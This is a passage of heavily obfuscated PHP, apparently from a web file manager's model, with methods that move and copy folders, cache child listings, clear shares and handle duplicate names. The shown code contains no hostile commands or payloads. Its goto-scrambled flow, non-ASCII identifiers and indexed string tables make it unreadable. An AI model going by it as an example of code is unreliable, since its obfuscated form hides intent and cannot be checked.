$Eâ¹¿ØÅôÀ[$bù½ÒÓÛË‡[461]]); $dî¤·«¦ÕÇ[] = array($bù½ÒÓÛË‡[369], $EÄŒ–›™Ëº, $bù½ÒÓÛË‡[459], $Eâ¹¿ØÅôÀ[$bù½ÒÓÛË‡[459]]); $this->_copyApplyMeta($däÀºõñÌÏ, $f”Ó÷ …’Œ); if ($däÀºõñÌÏ[$bù½ÒÓÛË‡[370]] != $bù½ÒÓÛË‡[83]) { $f”Ó÷ …’Œ[$bù½ÒÓÛË‡[501]][] = $däÀºõñÌÏ[$bù½ÒÓÛË‡[419]]; } } $this->chunkEventSet($bù½ÒÓÛË‡[513], array($bù½ÒÓÛË‡[514], $c´¶ŠÓ„”å, $dË“–£ƒ‘ß)); $this->saveAll($bŞ¼Íˆìµ); goto AİÓ³ïéŸ¶; F¾µ¼éª™Ç: } private function _childrenMakeRelation($f¤»æ é¬Ì, $aÔäŒˆªò) { $d¸Ê­¥  =& $_SERVER[îÖ]; $Då’øãÏ²ó = array(); $cŸ½×„×å = array(); foreach ($f¤»æ é¬Ì as $Cê³¤¿†‡) { $Añ°ä»Â‡Á = $Cê³¤¿†‡[$d¸Ê­¥ [28]] . $d¸Ê­¥ [8] . $Cê³¤¿†‡[$d¸Ê­¥ [459]]; $Då’øãÏ²ó[$Añ°ä»Â‡Á] = $Cê³¤¿†‡[$d¸Ê­¥ [369]]; } foreach ($aÔäŒˆªò as $Cê³¤¿†‡) { $Añ°ä»Â‡Á = $Cê³¤¿†‡[$d¸Ê­¥ [28]] . $d¸Ê­¥ [8] . $Cê³¤¿†‡[$d¸Ê­¥ [459]]; $bˆ÷Šƒ‚Í¿ = $Då’øãÏ²ó[$Añ°ä»Â‡Á]; $cŸ½×„×å[$bˆ÷Šƒ‚Í¿] = $Cê³¤¿†‡[$d¸Ê­¥ [369]]; } return $cŸ½×„×å; } private function _childrenMatch($D¡›Ğ§ÒŞ, $b†°ùìÎ‹, $eÃ„ºš‹Š) { goto C“õ´ò¿Á; AÆ¯×¨ŒÏ­: $aÎ‘Ë¦æ®Å = $e¼•âŸÛ‡[count($e¼•âŸÛ‡) - 1]; return array($c¡Ê“ìÉË­[461] => $aÎ‘Ë¦æ®Å, $c¡Ê“ìÉË­[459] => $AÖÎŒºÊè); goto eÄÁæÈôˆå; eÇŞ¨Ó£µ: foreach ($D—Ö™ì¦ˆØ as $BÕ—”‹ã—) { if (isset($D¡›Ğ§ÒŞ[$BÕ—”‹ã—])) { $AÖÎŒºÊè .= $D¡›Ğ§ÒŞ[$BÕ—”‹ã—] . $c¡Ê“ìÉË­[517]; } } $AÖÎŒºÊè = rtrim($AÖÎŒºÊè, $c¡Ê“ìÉË­[47]) . $c¡Ê“ìÉË­[47]; $e¼•âŸÛ‡ = $this->parentLevelArray($AÖÎŒºÊè); goto AÆ¯×¨ŒÏ­; C“õ´ò¿Á: $c¡Ê“ìÉË­ =& $_SERVER[îÖ]; $AÖÎŒºÊè = $eÃ„ºš‹Š[$c¡Ê“ìÉË­[459]]; $D—Ö™ì¦ˆØ = $this->parentLevelArray($b†°ùìÎ‹[$c¡Ê“ìÉË­[459]]); goto eÇŞ¨Ó£µ; eÄÁæÈôˆå: } private function _makeItemData($BµÚ»›è¿†, $fí§Ğ”Í, $EÈŠ¯ÖÆ) { $F¢âˆÙµÄ¾ =& $_SERVER[îÖ]; $fÇ¾®Ù¦É‘ = array($F¢âˆÙµÄ¾[518] => $BµÚ»›è¿†[$F¢âˆÙµÄ¾[370]], $F¢âˆÙµÄ¾[386] => $EÈŠ¯ÖÆ, $F¢âˆÙµÄ¾[519] => $BµÚ»›è¿†[$F¢âˆÙµÄ¾[372]], $F¢âˆÙµÄ¾[420] => $BµÚ»›è¿†[$F¢âˆÙµÄ¾[419]], $F¢âˆÙµÄ¾[520] => $BµÚ»›è¿†[$F¢âˆÙµÄ¾[77]], $F¢âˆÙµÄ¾[521] => $fí§Ğ”Í[$F¢âˆÙµÄ¾[371]], $F¢âˆÙµÄ¾[522] => $fí§Ğ”Í[$F¢âˆÙµÄ¾[456]], $F¢âˆÙµÄ¾[523] => USER_ID, $F¢âˆÙµÄ¾[524] => USER_ID, $F¢âˆÙµÄ¾[368] => $fí§Ğ”Í[$F¢âˆÙµÄ¾[369]], $F¢âˆÙµÄ¾[525] => $fí§Ğ”Í[$F¢âˆÙµÄ¾[459]] . $fí§Ğ”Í[$F¢âˆÙµÄ¾[369]] . $F¢âˆÙµÄ¾[47], $F¢âˆÙµÄ¾[396] => 0, $F¢âˆÙµÄ¾[526] => $F¢âˆÙµÄ¾[33]); return $fÇ¾®Ù¦É‘; } private function _copyApplyMeta($fŠµ·ãŸ‘ø, &$D¥ÅÃ¹åÇÒ) { $C»›´Ë¿—ã =& $_SERVER[îÖ]; $d—îÁ”¦¦ = $fŠµ·ãŸ‘ø[$C»›´Ë¿—ã[369]]; $bá®È‚¢è˜ = $fŠµ·ãŸ‘ø[$C»›´Ë¿—ã[28]]; if (!isset($fŠµ·ãŸ‘ø[$C»›´Ë¿—ã[527]]) || !$fŠµ·ãŸ‘ø[$C»›´Ë¿—ã[527]] || $fŠµ·ãŸ‘ø[$C»›´Ë¿—ã[527]] == $C»›´Ë¿—ã[468]) { $D¥ÅÃ¹åÇÒ[$C»›´Ë¿—ã[503]][] = array($C»›´Ë¿—ã[369], $d—îÁ”¦¦, $C»›´Ë¿—ã[527], short_id($d—îÁ”¦¦)); } if (Input::check($bá®È‚¢è˜, $C»›´Ë¿—ã[528])) { $D¥ÅÃ¹åÇÒ[$C»›´Ë¿—ã[502]][] = array($C»›´Ë¿—ã[369] => $d—îÁ”¦¦, $C»›´Ë¿—ã[89] => $C»›´Ë¿—ã[416], $C»›´Ë¿—ã[359] => str_replace($C»›´Ë¿—ã[50], $C»›´Ë¿—ã[33], Pinyin::encode($bá®È‚¢è˜))); $D¥ÅÃ¹åÇÒ[$C»›´Ë¿—ã[502]][] = array($C»›´Ë¿—ã[369] => $d—îÁ”¦¦, $C»›´Ë¿—ã[89] => $C»›´Ë¿—ã[415], $C»›´Ë¿—ã[359] => Pinyin::encode($bá®È‚¢è˜, $C»›´Ë¿—ã[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bª¯«—Û·Ì) { goto AòáœªÜ± ; AòáœªÜ± : $d½¦Š‚¾“ =& $_SERVER[îÖ]; $FÕ‡ÒŠ‡›Õ = $this->sourceInfo($bª¯«—Û·Ì); $B Êéä°Å = $d½¦Š‚¾“[530]; goto E¬šçÑõ–÷; EˆèÍˆ˜¥: $AŒ×Æ®ñ‚ = array_to_keyvalue($AŒ×Æ®ñ‚, $d½¦Š‚¾“[369]); foreach ($AŒ×Æ®ñ‚ as $B¯»´ˆ•‚õ) { $B‹‚³º›ä• = $B¯»´ˆ•‚õ[$d½¦Š‚¾“[461]]; $bª¯«—Û·Ì = $B¯»´ˆ•‚õ[$d½¦Š‚¾“[369]]; if (!isset($this->_childrenListCache[$bª¯«—Û·Ì]) && $B¯»´ˆ•‚õ[$d½¦Š‚¾“[370]] == $d½¦Š‚¾“[83]) { $this->_childrenListCache[$bª¯«—Û·Ì] = array(); } if (!isset($this->_childrenListCache[$B‹‚³º›ä•])) { $this->_childrenListCache[$B‹‚³º›ä•] = array(); } $this->_childrenListCache[$B‹‚³º›ä•][$bª¯«—Û·Ì] = $B¯»´ˆ•‚õ; $this->_childrenItemCache[$bª¯«—Û·Ì] = $B¯»´ˆ•‚õ; } goto F·‰Ëİ™®Ê; E¬šçÑõ–÷: $c Á°ÑÓá… = array($d½¦Š‚¾“[459] => array($d½¦Š‚¾“[483], $FÕ‡ÒŠ‡›Õ[$d½¦Š‚¾“[459]] . $bª¯«—Û·Ì . $d½¦Š‚¾“[484]), $d½¦Š‚¾“[397] => $this->targetIsDelete); $AŒ×Æ®ñ‚ = $this->field($B Êéä°Å)->where($c Á°ÑÓá…)->select(); if (!$AŒ×Æ®ñ‚) { return; } goto EˆèÍˆ˜¥; F·‰Ëİ™®Ê: } private function _childrenListAll($B¾ÊíÔ‚»Ì, &$A‹æóå¸è²) { $DĞÉ¥Õ“ =& $_SERVER[îÖ]; if (!isset($this->_childrenListCache[$B¾ÊíÔ‚»Ì])) { return; } $DíøĞ¼¤Üó = $this->_childrenListCache[$B¾ÊíÔ‚»Ì]; foreach ($DíøĞ¼¤Üó as $fæİŞö™× => $Eî®Ï‚‡Äï) { $A‹æóå¸è²[$fæİŞö™×] = $Eî®Ï‚‡Äï; if ($Eî®Ï‚‡Äï[$DĞÉ¥Õ“[370]] == $DĞÉ¥Õ“[83]) { $this->_childrenListAll($fæİŞö™×, $A‹æóå¸è²); } } } private function sourceInfoCache($EŞÆßÉ®Ş‘) { if (isset($this->_childrenItemCache[$EŞÆßÉ®Ş‘])) { return $this->_childrenItemCache[$EŞÆßÉ®Ş‘]; } return $this->sourceInfo($EŞÆßÉ®Ş‘); } private function _childrenList($E‰ƒ±£Ì”“) { if (isset($this->_childrenListCache[$E‰ƒ±£Ì”“])) { return $this->_childrenListCache[$E‰ƒ±£Ì”“]; } return $this->_childrenListSelect($E‰ƒ±£Ì”“); } private function _childrenListSelect($e¯šìï‚¯ƒ) { goto aËÎõ¦—ò; FÆâÍâ²Ÿ: foreach ($DÁšÏ¡À«Î as $e¯šìï‚¯ƒ => $báƒò“ù°ˆ) { $this->_childrenItemCache[$e¯šìï‚¯ƒ] = $báƒò“ù°ˆ; } return $DÁšÏ¡À«Î; goto F••‡óà”; Eä±™ÍÔµ: $CŒØ÷îì = $CŒØ÷îì ? $CŒØ÷îì : array(); $DÁšÏ¡À«Î = array_to_keyvalue($CŒØ÷îì, $bàøÈ•Ş§ß[369]); $this->_childrenListCache[$e¯šìï‚¯ƒ] = $DÁšÏ¡À«Î; goto FÆâÍâ²Ÿ; aËÎõ¦—ò: $bàøÈ•Ş§ß =& $_SERVER[îÖ]; $F™’æô’Á = array($bàøÈ•Ş§ß[461] => $e¯šìï‚¯ƒ, $bàøÈ•Ş§ß[397] => $this->targetIsDelete); $CŒØ÷îì = $this->where($F™’æô’Á)->select(); goto Eä±™ÍÔµ; F••‡óà”: } private function fileNameExistCache($AÌ‰”“õÃ, $c°°Ç«‹÷®) { $BÏºØ§¶Å =& $_SERVER[îÖ]; $c°°Ç«‹÷® = strtolower($c°°Ç«‹÷®); $CÓí‚ÁÚÇ´ = $this->_childrenList($AÌ‰”“õÃ); foreach ($CÓí‚ÁÚÇ´ as $f³Ø§ĞÂÈ) { if ($c°°Ç«‹÷® == strtolower($f³Ø§ĞÂÈ[$BÏºØ§¶Å[28]])) { return $f³Ø§ĞÂÈ[$BÏºØ§¶Å[369]]; } } return !1; } private function fileNameAutoCache($cË§ªªÎ›Ò, $f±¸¸Â™Ê“, $e„Ÿ¬­¦³Ä, $eÛñÆ½ÍÄÆ) { $D’×ç¹µ˜× =& $_SERVER[îÖ]; $F«Ø©ÎÑ = $this->_childrenList($cË§ªªÎ›Ò); $D‘ËÅõ«ù = array_to_keyvalue($F«Ø©ÎÑ, $D’×ç¹µ˜×[33], $D’×ç¹µ˜×[28]); return $this->fileNameAutoGet($D‘ËÅõ«ù, $f±¸¸Â™Ê“, $e„Ÿ¬­¦³Ä, $eÛñÆ½ÍÄÆ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($AÀ¨Ùé­Ù, $d‰¶ÌÚŠÔò, $Cëù‡¤ø˜Ä = REPEAT_REPLACE, $aÅã¸‰›œğ = '') { goto c›‡÷¶™ª¶; F«Ë«îÒ›Ğ: $f˜ÇĞËÚœ = $this->fileNameExistCache($d‰¶ÌÚŠÔò, $aÀø¿éæÆ[$cÆÖøäÛ»†[28]]); $Fµ·Ñ‘ñæï = $this->_move($AÀ¨Ùé­Ù, $d‰¶ÌÚŠÔò, $Cëù‡¤ø˜Ä, $a·Ã™‚Ìãˆ, $aÅã¸‰›œğ); $this->sourceCacheClear(); goto bÖòİ…‰½Ô; cë®¿¹ñŒÛ: $this->folderSizeReset($d‰¶ÌÚŠÔò); $a÷³ùÇ’Ö = array($aÀø¿éæÆ[$cÆÖøäÛ»†[461]], $d‰¶ÌÚŠÔò); if ($aÀø¿éæÆ[$cÆÖøäÛ»†[370]] == $cÆÖøäÛ»†[83]) { $a÷³ùÇ’Ö[] = $AÀ¨Ùé­Ù; } goto cŞ˜ã·á­ ; dŸ¦Š‹›Õ: if ($aÀø¿éæÆ[$cÆÖøäÛ»†[461]] == $d‰¶ÌÚŠÔò && $aÅã¸‰›œğ != $aÀø¿éæÆ[$cÆÖøäÛ»†[28]]) { $Aõ´‰øÅ… = $this->fileNameExist($d‰¶ÌÚŠÔò, $aÅã¸‰›œğ); if ($Aõ´‰øÅ… && $aÀø¿éæÆ[$cÆÖøäÛ»†[370]] == $cÆÖøäÛ»†[468]) { goto E®‹ÂöèÄõ; E®‹ÂöèÄõ: $Dˆõ‡¸¼¾ = $this->sourceInfo($Aõ´‰øÅ…); $cº‹Ê—Å = $this->fileHistory($Dˆõ‡¸¼¾, $aÀø¿éæÆ[$cÆÖøäÛ»†[419]], $aÀø¿éæÆ[$cÆÖøäÛ»†[77]]); if (!$cº‹Ê—Å) { Model($cÆÖøäÛ»†[422])->remove($aÀø¿éæÆ[$cÆÖøäÛ»†[419]]); } goto EÍÍ§Ä´†; EÍÍ§Ä´†: $this->removeNow($AÀ¨Ùé­Ù, !1); $this->folderSizeReset($d‰¶ÌÚŠÔò); Hook::trigger($cÆÖøäÛ»†[532], $a•„‹ª÷); goto C»ŒÊ˜Óä; C»ŒÊ˜Óä: return $Aõ´‰øÅ…; goto dğ„ˆì°¢; dğ„ˆì°¢: } } $e“ğ½ÍÄâ˜ = $aÅã¸‰›œğ ? $aÅã¸‰›œğ : $aÀø¿éæÆ[$cÆÖøäÛ»†[28]]; $this->lockMoveStart($AÀ¨Ùé­Ù); goto B‹‚¥£ÇÔ; B‹‚¥£ÇÔ: $this->lockWriteStart($d‰¶ÌÚŠÔò, $e“ğ½ÍÄâ˜); $a·Ã™‚Ìãˆ = array($cÆÖøäÛ»†[501] => array(), $cÆÖøäÛ»†[533] => !1); $this->clearShare($AÀ¨Ùé­Ù, $d‰¶ÌÚŠÔò); goto F«Ë«îÒ›Ğ; bÖòİ…‰½Ô: if ($aÀø¿éæÆ[$cÆÖøäÛ»†[370]] == $cÆÖøäÛ»†[83] && $f˜ÇĞËÚœ) { $this->folderSizeResetChildren($Fµ·Ñ‘ñæï); } Model($cÆÖøäÛ»†[167])->linkAdd($a·Ã™‚Ìãˆ[$cÆÖøäÛ»†[501]]); if ($f˜ÇĞËÚœ && $a·Ã™‚Ìãˆ[$cÆÖøäÛ»†[533]]) { $this->removeNow($AÀ¨Ùé­Ù, !1); } goto CŞ£©£§¼Ã; Bß²¨ÅÍàì: if (!$aÀø¿éæÆ || !$a×‚ÁÜŸØ || $a×‚ÁÜŸØ[$cÆÖøäÛ»†[370]] != $cÆÖøäÛ»†[83]) { return !1; } Hook::trigger($cÆÖøäÛ»†[531], $a•„‹ª÷); $this->targetIsDelete = intval($aÀø¿éæÆ[$cÆÖøäÛ»†[397]]); goto dŸ¦Š‹›Õ; B¦’²Ç‘Ò§: return $Fµ·Ñ‘ñæï; goto c†µ¿®Ä¼; c›‡÷¶™ª¶: $cÆÖøäÛ»† =& $_SERVER[îÖ]; $aÀø¿éæÆ = $this->sourceInfo($AÀ¨Ùé­Ù); $a×‚ÁÜŸØ = $this->sourceInfo($d‰¶ÌÚŠÔò); goto bŞ‡ñ‘Á’Õ; CŞ£©£§¼Ã: $this->lockMoveEnd($AÀ¨Ùé­Ù); $this->lockWriteEnd($d‰¶ÌÚŠÔò, $e“ğ½ÍÄâ˜); $this->folderSizeReset($aÀø¿éæÆ[$cÆÖøäÛ»†[461]]); goto cë®¿¹ñŒÛ; cŞ˜ã·á­ : $this->updateModifyTime($a÷³ùÇ’Ö); Model($cÆÖøäÛ»†[505])->eventMove($AÀ¨Ùé­Ù, $aÀø¿éæÆ[$cÆÖøäÛ»†[461]], $d‰¶ÌÚŠÔò); Hook::trigger($cÆÖøäÛ»†[532], $a•„‹ª÷); goto B¦’²Ç‘Ò§; bŞ‡ñ‘Á’Õ: if ($aÀø¿éæÆ[$cÆÖøäÛ»†[461]] == $a×‚ÁÜŸØ[$cÆÖøäÛ»†[369]]) { if ($aÀø¿éæÆ[$cÆÖøäÛ»†[397]] == $cÆÖøäÛ»†[83]) { Model($cÆÖøäÛ»†[395])->restore(array($AÀ¨Ùé­Ù)); } return $AÀ¨Ùé­Ù; } $a•„‹ª÷ = $this->pathInfoMore($AÀ¨Ùé­Ù); if ($this->isParentOf($AÀ¨Ùé­Ù, $d‰¶ÌÚŠÔò)) { return !1; } goto Bß²¨ÅÍàì; c†µ¿®Ä¼: } private function _move($D—ÒŒÁš—¿, $Bğ£²¹¡éè, $E‚ìâÕŠƒ…, &$d‡æÈå÷ªœ, $A‰ÌïŞš = '') { goto dÑ¤ñ·ß¤Í; e‹¼È·ÇÆ: return $AãÓ—‚Ïõ; goto cŸÀ× ãŒ; e¶ÏÓµš¥Ş: $E‚ÎÆÇÔ³Ù = !1; if ($D¼Ê ùÕë) { if ($E‚ìâÕŠƒ… == REPEAT_RENAME_FOLDER) { $E ã„‚×õÅ = $this->fileNameAuto($Bğ£²¹¡éè, $E ã„‚×õÅ, $E‚ìâÕŠƒ…, $D¼Ê ùÕë); $AãÓ—‚Ïõ = $this->_moveForce($D—ÒŒÁš—¿, $Bğ£²¹¡éè, $E ã„‚×õÅ); } else { if ($E‚ìâÕŠƒ… == REPEAT_RENAME_FOLDER) { $E‚ìâÕŠƒ… = REPEAT_RENAME; } $Fä¾Ãæ·í‹ = $this->_childrenListSelect($D—ÒŒÁš—¿); foreach ($Fä¾Ãæ·í‹ as $BÌö²ƒÚìé) { $this->_move($BÌö²ƒÚìé[$D§ÄÕÓ…[369]], $F°éºöÖ, $E‚ìâÕŠƒ…, $d‡æÈå÷ªœ); } $E‚ÎÆÇÔ³Ù = !0; } } else { if ($E‚ìâÕŠƒ… == REPEAT_SKIP) { $E‚ÎÆÇÔ³Ù = !0; } else { if ($E‚ìâÕŠƒ… == REPEAT_RENAME || $E‚ìâÕŠƒ… == REPEAT_RENAME_FOLDER) { $E ã„‚×õÅ = $this->fileNameAuto($Bğ£²¹¡éè, $E ã„‚×õÅ, $E‚ìâÕŠƒ…, $D¼Ê ùÕë); $AãÓ—‚Ïõ = $this->_moveForce($D—ÒŒÁš—¿, $Bğ£²¹¡éè, $E ã„‚×õÅ); } else { if ($E‚ìâÕŠƒ… == REPEAT_REPLACE) { $bã‡÷ÅĞÆ‘ = $this->sourceInfoCache($F°éºöÖ); $A¥Ùñ¹ˆ‚­ = $this->fileHistory($bã‡÷ÅĞÆ‘, $cä——âçç†[$D§ÄÕÓ…[419]], $cä——âçç†[$D§ÄÕÓ…[77]]); if ($A¥Ùñ¹ˆ‚­) { $d‡æÈå÷ªœ[$D§ÄÕÓ…[501]][] = $cä——âçç†[$D§ÄÕÓ…[419]]; } else { $E‚ÎÆÇÔ³Ù = !0; } } } } } if ($E‚ÎÆÇÔ³Ù && !$d‡æÈå÷ªœ[$D§ÄÕÓ…[533]]) { $d‡æÈå÷ªœ[$D§ÄÕÓ…[533]] = !0; } goto e‹¼È·ÇÆ; dÑ¤ñ·ß¤Í: $D§ÄÕÓ… =& $_SERVER[îÖ]; $cä——âçç† = $this->sourceInfo($D—ÒŒÁš—¿); $D¼Ê ùÕë = $cä——âçç†[$D§ÄÕÓ…[370]] == $D§ÄÕÓ…[83]; goto Aê…¯ø ‰¢; F‰ƒ—†¨: $this->lockWriteStart($Bğ£²¹¡éè, $E ã„‚×õÅ); if (!$F°éºöÖ) { return $this->_moveForce($D—ÒŒÁš—¿, $Bğ£²¹¡éè, $E ã„‚×õÅ); } $AãÓ—‚Ïõ = $F°éºöÖ; goto e¶ÏÓµš¥Ş; Aê…¯ø ‰¢: $E ã„‚×õÅ = $A‰ÌïŞš ? $A‰ÌïŞš : $cä——âçç†[$D§ÄÕÓ…[28]]; $F°éºöÖ = $this->fileNameExistCache($Bğ£²¹¡éè, $E ã„‚×õÅ); $this->lockMoveStart($D—ÒŒÁš—¿); goto F‰ƒ—†¨; cŸÀ× ãŒ: } private function _moveForce($D–ŸÜ“‰ßÊ, $eâŠ¾‰ˆ“£, $b«´¢·ÅÀ) { goto a£ˆ”³æÖá; aäÕÓĞÚÁò: if ($EõŠ‹‚áĞË) { $f¢êó·³‡™ = array($dä…ôêÏ­İ[525] => array($dä…ôêÏ­İ[483], $b™õäÀß[$dä…ôêÏ­İ[459]] . $b™õäÀß[$dä…ôêÏ­İ[369]] . $dä…ôêÏ­İ[484])); $eò­Ñ”ˆå = $b™õäÀß[$dä…ôêÏ­İ[459]] . $b™õäÀß[$dä…ôêÏ­İ[369]] . $dä…ôêÏ­İ[47]; $bÙ­´Çì¯ = $aëˆœ‹Ñ[$dä…ôêÏ­İ[459]] . $aëˆœ‹Ñ[$dä…ôêÏ­İ[369]] . $dä…ôêÏ­İ[47] . $b™õäÀß[$dä…ôêÏ­İ[369]] . $dä…ôêÏ­İ[47]; $B™Ì›ˆ¤á• = array($dä…ôêÏ­İ[525] => array($dä…ôêÏ­İ[534], "\162\145\160\x6c\141\143\145\x28\x70\x61\x72\145\x6e\x74\x4c\145\x76\145\154\x2c\47{$eò­Ñ”ˆå}\47\54\47{$bÙ­´Çì¯}\47\51"), $dä…ôêÏ­İ[521] => $aëˆœ‹Ñ[$dä…ôêÏ­İ[371]], $dä…ôêÏ­İ[522] => $aëˆœ‹Ñ[$dä…ôêÏ­İ[456]]); if ($cºòÇâæĞĞ) { $B™Ì›ˆ¤á•[$dä…ôêÏ­İ[396]] = 0; } $this->where($f¢êó·³‡™)->data($B™Ì›ˆ¤á•)->save(); } $this->where(array($dä…ôêÏ­İ[383] => $D–ŸÜ“‰ßÊ))->data($Eë³Òø¶£É)->save(); return $D–ŸÜ“‰ßÊ; goto BÚ§Ûø“Ã; CĞäÔ´äËç: $EõŠ‹‚áĞË = $b™õäÀß[$dä…ôêÏ­İ[370]] == $dä…ôêÏ­İ[83]; $Eë³Òø¶£É = array($dä…ôêÏ­İ[368] => $aëˆœ‹Ñ[$dä…ôêÏ­İ[369]], $dä…ôêÏ­İ[525] => $aëˆœ‹Ñ[$dä…ôêÏ­İ[459]] . $aëˆœ‹Ñ[$dä…ôêÏ­İ[369]] . $dä…ôêÏ­İ[47], $dä…ôêÏ­İ[521] => $aëˆœ‹Ñ[$dä…ôêÏ­İ[371]], $dä…ôêÏ­İ[522] => $aëˆœ‹Ñ[$dä…ôêÏ­İ[456]], $dä…ôêÏ­İ[524] => USER_ID, $dä…ôêÏ­İ[386] => $b«´¢·ÅÀ); $cä‘öö…Ú = $b™õäÀß[$dä…ôêÏ­İ[371]] == SourceModel::TYPE_GROUP && $aëˆœ‹Ñ[$dä…ôêÏ­İ[371]] == SourceModel::TYPE_GROUP && $b™õäÀß[$dä…ôêÏ­İ[456]] == $aëˆœ‹Ñ[$dä…ôêÏ­İ[456]]; goto bƒ³·¤Ü; bƒ³·¤Ü: if (!$cä‘öö…Ú) { Model($dä…ôêÏ­İ[454])->authClear($D–ŸÜ“‰ßÊ); } $cºòÇâæĞĞ = $b™õäÀß[$dä…ôêÏ­İ[397]] == $dä…ôêÏ­İ[83] && $aëˆœ‹Ñ[$dä…ôêÏ­İ[397]] != $dä…ôêÏ­İ[83]; if ($cºòÇâæĞĞ) { $Eë³Òø¶£É[$dä…ôêÏ­İ[396]] = 0; } goto aäÕÓĞÚÁò; a£ˆ”³æÖá: $dä…ôêÏ­İ =& $_SERVER[îÖ]; $b™õäÀß = $this->sourceInfo($D–ŸÜ“‰ßÊ); $aëˆœ‹Ñ = $this->sourceInfo($eâŠ¾‰ˆ“£); goto CĞäÔ´äËç; BÚ§Ûø“Ã: } private function clearShare($B‹Â’ÇåŒÎ, $bˆ„£“ —) { goto DÙãŒÅÀéõ; F¦×¯ˆ”‰: if (!$A«·º°º—ñ) { return; } $A«·º°º—ñ = array_to_keyvalue($A«·º°º—ñ, $AœÁÚáˆ‚÷[33], $AœÁÚáˆ‚÷[441]); $c†¨íÆ‡×Ë = array($AœÁÚáˆ‚÷[441] => array($AœÁÚáˆ‚÷[7], $A«·º°º—ñ)); goto Eó…­¹´Ù; DÙãŒÅÀéõ: $AœÁÚáˆ‚÷ =& $_SERVER[îÖ]; $FùâÍÒÃ¾ = $this->sourceInfo($B‹Â’ÇåŒÎ); $Bî—š¿…Ûß = $this->sourceInfo($bˆ„£“ —); goto C›õ—ÀÚ“­; Eó…­¹´Ù: Model($AœÁÚáˆ‚÷[536])->where($c†¨íÆ‡×Ë)->save(array($AœÁÚáˆ‚÷[448] => 0)); Model($AœÁÚáˆ‚÷[537])->where($c†¨íÆ‡×Ë)->delete(); goto céŠÙ¸ÁŒ°; eˆª–á„„†: if (!$Bá¸ìö²˜œ) { return; } $c†¨íÆ‡×Ë = array($AœÁÚáˆ‚÷[369] => array($AœÁÚáˆ‚÷[7], $Bá¸ìö²˜œ), $AœÁÚáˆ‚÷[448] => 1); $A«·º°º—ñ = Model($AœÁÚáˆ‚÷[536])->field($AœÁÚáˆ‚÷[441])->where($c†¨íÆ‡×Ë)->select(); goto F¦×¯ˆ”‰; C›õ—ÀÚ“­: if ($FùâÍÒÃ¾[$AœÁÚáˆ‚÷[456]] == $Bî—š¿…Ûß[$AœÁÚáˆ‚÷[456]] && $FùâÍÒÃ¾[$AœÁÚáˆ‚÷[371]] == $AœÁÚáˆ‚÷[535]) { return; } $c†¨íÆ‡×Ë = array($AœÁÚáˆ‚÷[459] => array($AœÁÚáˆ‚÷[483], $FùâÍÒÃ¾[$AœÁÚáˆ‚÷[459]] . $B‹Â’ÇåŒÎ . $AœÁÚáˆ‚÷[484])); $Bá¸ìö²˜œ = $this->field($AœÁÚáˆ‚÷[383])->where($c†¨íÆ‡×Ë)->getField($AœÁÚáˆ‚÷[369], !0); goto eˆª–á„„†; céŠÙ¸ÁŒ°: } public function copyFolderFromIO($b»Ò©©²¿˜, $dùïƒßœİÊ, $A…ˆ¥ï„Ó, $D®½Šì“Ãİ, $AÑôãàï, $D®½“°Ñ¬„ = false) { goto fš¬ô¨¯õ²; C˜¼œ„ ç: if ($BÙÁ«Üºä) { $this->_childrenAllMake($BÙÁ«Üºä); } Hook::trigger($A¥‚ÍÛÜĞˆ[539]); $this->_copyChildTo($b»Ò©©²¿˜, $dùïƒßœİÊ, $BßÂƒä§¥ê, $D®½Šì“Ãİ, $a¦ööã»å, $AÑôãàï); goto A¸„˜ß…ÂÖ; C³À¹ê: $this->updateModifyTime($A…ˆ¥ï„Ó); return $BßÂƒä§¥ê; goto DÑˆÒãÊ›´; d§ˆØéÄ’: Model($A¥‚ÍÛÜĞˆ[422])->linkAdd($a¦ööã»å[$A¥‚ÍÛÜĞˆ[501]]); Model($A¥‚ÍÛÜĞˆ[422])->remove($a¦ööã»å[$A¥‚ÍÛÜĞˆ[538]]); $this->folderSizeReset($A…ˆ¥ï„Ó); goto C³À¹ê; C¨ ÓÀĞâ‹: $BÙÁ«Üºä = $this->fileNameExist($A…ˆ¥ï„Ó, $C‡ÓåöÕç‰); $BßÂƒä§¥ê = $this->mkdir($A…ˆ¥ï„Ó, $C‡ÓåöÕç‰, $D®½Šì“Ãİ); if (!$BÙÁ«Üºä || $D®½Šì“Ãİ == REPEAT_RENAME_FOLDER) { $D®½Šì“Ãİ = !1; } goto C˜¼œ„ ç; Cñ¥ñİÊ÷—: Model($A¥‚ÍÛÜĞˆ[504])->addAll($a¦ööã»å[$A¥‚ÍÛÜĞˆ[502]], array(), !0); Model($A¥‚ÍÛÜĞˆ[505])->eventCopy($BßÂƒä§¥ê); $this->saveAll($a¦ööã»å[$A¥‚ÍÛÜĞˆ[503]]); goto d§ˆØéÄ’; fš¬ô¨¯õ²: $A¥‚ÍÛÜĞˆ =& $_SERVER[îÖ]; $a¦ööã»å = array($A¥‚ÍÛÜĞˆ[502] => array(), $A¥‚ÍÛÜĞˆ[503] => array(), $A¥‚ÍÛÜĞˆ[501] => array(), $A¥‚ÍÛÜĞˆ[538] => array()); $C‡ÓåöÕç‰ = $D®½“°Ñ¬„ ? $D®½“°Ñ¬„ : $b»Ò©©²¿˜->getPathName($b»Ò©©²¿˜->pathThis($dùïƒßœİÊ)); goto C¨ ÓÀĞâ‹; A¸„˜ß…ÂÖ: Hook::trigger($A¥‚ÍÛÜĞˆ[540]); if ($BßÂƒä§¥ê) { $this->folderSizeResetChildren($BßÂƒä§¥ê); } $this->_childrenListClear(); goto Cñ¥ñİÊ÷—; DÑˆÒãÊ›´: } private function _copyChildTo($a„öãìÉÁÍ, $d°„ïÏ¥ß, $FéŒ®ñ†§, $eğ¸µ‘×¹¡, &$CùÃœÔõ‘, $fÛï´ï§‹ï) { goto dªá„‹ìĞ; C¼«±¡àÕó: foreach ($f„ºô¸ÆÃ½ as &$fì§óîĞÀ) { goto c„¢­„¢Ï; c‹Ü‹¾Ó“: if ($eğ¸µ‘×¹¡) { $D‡£×õ‚ìæ = $this->fileNameExistCache($FéŒ®ñ†§, $fì§óîĞÀ[$b¤Æ ¢Î»[28]]); if ($D‡£×õ‚ìæ) { if ($fì§óîĞÀ[$b¤Æ ¢Î»[370]] || $eğ¸µ‘×¹¡ == REPEAT_SKIP) { continue; } if ($eğ¸µ‘×¹¡ == REPEAT_REPLACE) { $CäÉ°Õ±…Ş = $this->sourceInfoCache($D‡£×õ‚ìæ); $e‹¬‡‹‡„³ = 